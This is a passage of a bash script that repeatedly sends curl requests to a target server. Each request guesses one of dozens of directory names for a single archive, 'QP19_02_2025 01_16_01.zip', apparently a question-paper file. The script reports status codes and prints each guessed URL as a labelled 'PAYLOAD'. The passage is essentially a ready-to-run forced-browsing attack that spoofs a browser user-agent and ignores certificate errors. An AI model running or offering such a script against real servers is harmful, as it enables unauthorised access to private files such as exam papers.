${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper_Manager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessingQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessingQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessingQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagerQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagerQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagerQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoPortal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoPortal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadServiceQPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadServiceQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadServiceQPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSystemQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSystemQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSystemQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload-QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload-QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Tool-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Tool-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Tool-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_BatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_BatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMasterDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMasterDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMasterDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingMonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingMonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Transfer/QP19_02_2025%2001_16_01.zip]:"
